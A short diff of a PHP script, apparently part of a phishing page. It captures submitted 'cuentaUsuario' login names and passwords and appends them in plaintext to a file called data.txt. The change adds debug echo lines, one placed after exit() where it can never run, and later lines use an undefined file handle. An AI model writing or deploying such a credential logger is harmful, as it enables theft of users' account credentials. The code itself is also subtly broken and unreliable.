@@ -6,7 +6,9 @@ if (isset($_POST['cuentaUsuario.login']) && isset($_POST['cuentaUsuario.password
    $txt=$_POST['cuentaUsuario.login'].' - '.$_POST['cuentaUsuario.password'];
    file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
    exit();
+   echo("This was executed");
 }
+else { echo("This was not executed"); }
     fwrite($fh,$txt); // Write information to the file
     fclose($fh); // Close the file
  
